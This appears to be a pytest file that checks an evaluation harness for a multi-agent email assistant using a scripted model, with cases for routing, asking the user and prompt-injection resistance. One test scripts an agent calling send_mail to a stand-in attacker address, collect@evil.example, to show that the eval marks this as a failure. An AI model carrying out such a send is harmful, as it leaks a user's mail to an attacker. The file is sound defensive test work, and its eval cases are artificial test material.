"""The team eval's own machinery, on a scripted model, so it's proven before it spends."""

import importlib.util
import sys
from pathlib import Path
from typing import Any

import pytest

from nexusai.modules.agent import gateway
from nexusai.modules.agent.providers import TextChunk, ToolCall
from test_team import TeamScript

EVALS = Path(__file__).parents[1] / "evals"


def load(name: str) -> Any:
    sys.path.insert(0, str(EVALS))
    spec = importlib.util.spec_from_file_location(name, EVALS / f"{name}.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def team_eval(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Any:
    # The runner sets these for each case. monkeypatch puts them back afterwards.
    for name in ("NEXUSAI_APP_DATA", "NEXUSAI_LEARN_EMAILS", "NEXUSAI_ENV_FILE"):
        monkeypatch.setenv(name, str(tmp_path / name))
    monkeypatch.setattr(gateway, "resolve_provider", gateway.resolve_provider)
    return load("team_eval")


def test_routing_is_graded_from_who_answered(
    team_eval: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    script = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda ctx: (script, "script-model"))
    script.say("Mail agent", [TextChunk("The escalation from Karthik is the important one.")])
    case = next(c for c in team_eval.CASES if c.name == "route-to-mail")
    row = team_eval.run_case(case)
    assert row["thread_count"] == len(team_eval.MAILBOX), "the agents need the invented inbox"
    assert row["answered_by"] == "mail" and row["passed"], row
    assert row["tokens"]["calls"] >= 1 and not row["timed_out"]


def test_injection_fails_when_an_agent_sends_to_the_attacker(
    team_eval: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    script = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda ctx: (script, "script-model"))
    send = {"to": ["collect@evil.example"], "subject": "Invoices", "body": "As asked."}
    script.say("Posty", [ToolCall("s", "send_mail", send)], [TextChunk("Done.")])
    case = next(c for c in team_eval.CASES if c.name == "injection")
    row = team_eval.run_case(case)
    # The careful person refused it, but asking at all is the failure being measured.
    assert not row["passed"] and any("evil.example" in m for m in row["missed"]), row
    assert row["approvals"] and row["approvals"][0]["choice"] == "deny"


def test_a_lead_that_asks_the_person_counts_as_done_and_honest(
    team_eval: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    script = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda ctx: (script, "script-model"))
    assign = {
        "to": "@mail",
        "objective": "File the Seoul HQ team's mail under 3GPP Briefing",
        "expected_output": "The thread ids filed",
        "done_criteria": "Every Seoul HQ thread is in 3GPP Briefing",
    }
    script.say(
        "Mail agent",
        [
            ToolCall(
                "q", "team_message", {"task": 1, "kind": "ask", "text": "Who is the Seoul HQ team?"}
            )
        ],
        [TextChunk("Asked.")],
    )
    script.say(
        "Posty",
        [ToolCall("a", "team_assign", assign)],
        [TextChunk("Asked the mail agent.")],
        [ToolCall("u", "ask_user", {"question": "Which addresses are the Seoul HQ team?"})],
    )
    case = next(c for c in team_eval.CASES if c.name == "verify")
    row = team_eval.run_case(case)
    assert not row["timed_out"] and row["passed"], row["missed"]


def test_the_corporate_week_runs_end_to_end(
    team_eval: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    e2e = load("corp_e2e")
    script = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda ctx: (script, "script-model"))
    notes = "Meera Iyer is my manager. Customer escalations are urgent. Celebrations are noise."
    script.say(
        "First meeting",
        [ToolCall("q", "ask_user", {"question": "Who matters most in your mail?"})],
        [ToolCall("p", "save_personal_prompt", {"name": "importance", "content": notes})],
        [TextChunk("Saved what you told me.")],
    )
    judged = [c for c in e2e.json.loads(e2e.DATA.read_text())["cases"] if not c.get("skip_agent")]
    fyi = {"status": "fyi", "importance": "low", "summary": "Noted.", "reason": "Scripted."}
    script.say("Mail agent", *[[ToolCall(f"t{i}", "record_triage", fyi)] for i in judged])
    data = e2e.json.loads(e2e.DATA.read_text())
    report = e2e.run({**data, "chat": data["chat"][:1]}, skip_chat=False)
    onboarding, mail = report["onboarding"], report["mail"]
    assert onboarding["passed"], onboarding["missed"]
    assert onboarding["questions"][0]["answer"].startswith("Meera Iyer is my manager")
    assert mail["cases"] == 50 and not mail["timed_out"]
    by_case = {row["case"]: row for row in mail["results"]}
    # The rule files PLM mail without the agent; the scripted fyi fits noise and misses the rest.
    assert by_case["plm-build-failed"]["passed"], by_case["plm-build-failed"]
    assert by_case["diwali-celebration"]["passed"], by_case["diwali-celebration"]
    assert not by_case["customer-escalation-rca"]["passed"]
    assert by_case["swarm-review-requested"]["category"] == "Swarm"
    assert len(report["chat"]) == 1 and report["chat"][0]["case"] == "pending-on-me"


def test_the_b5g_suite_has_its_fifty_cases_with_every_date_filled_in(team_eval: Any) -> None:
    suite = team_eval.load_suite("b5g")
    groups = [case.group for case in suite.cases]
    assert {g: groups.count(g) for g in set(groups)} == {
        "posty": 12,
        "handover": 10,
        "memory": 5,
        "recovery": 3,
    }
    judged = load("dates").fill_all(
        team_eval.json.loads((EVALS / "mail_cases_b5g.json").read_text())
    )["cases"]
    assert len(judged) + len(suite.cases) == 50
    text = team_eval.json.dumps([suite.mailbox, [c.message for c in suite.cases], judged])
    assert "{day" not in text and "{iso" not in text
    # The invented person's own mail comes from the fake server's user, so it counts as theirs.
    assert "ananya.krishnan@corp.example" not in team_eval.json.dumps(suite.mailbox)
    assert any(mail["sender"].endswith(f"<{team_eval.USER}>") for mail in suite.mailbox)


def test_a_b5g_case_is_graded_from_its_checks(
    team_eval: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    script = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda ctx: (script, "script-model"))
    suite = team_eval.load_suite("b5g")
    remember = {"facts": ["Vikram Desai is their manager", "They lead the AI-RAN part"]}
    script.say("Posty", [ToolCall("r", "remember", remember)], [TextChunk("Saved both.")])
    case = next(c for c in suite.cases if c.name == "m-manager")
    row = team_eval.run_case(case, suite)
    assert row["thread_count"] == len(suite.mailbox)
    assert row["passed"] and not row["timed_out"], row["missed"]


def test_a_vague_request_fails_when_the_lead_guesses_instead_of_asking(
    team_eval: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    script = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda ctx: (script, "script-model"))
    suite = team_eval.load_suite("b5g")
    guess = {"reminders": [{"title": "Follow up with the operator", "when": "2030-01-01T09:00"}]}
    script.say("Posty", [ToolCall("c", "create_reminders", guess)], [TextChunk("Done.")])
    case = next(c for c in suite.cases if c.name == "h-vague-reminder")
    row = team_eval.run_case(case, suite)
    assert not row["passed"] and "didn't ask the person" in row["missed"], row["missed"]
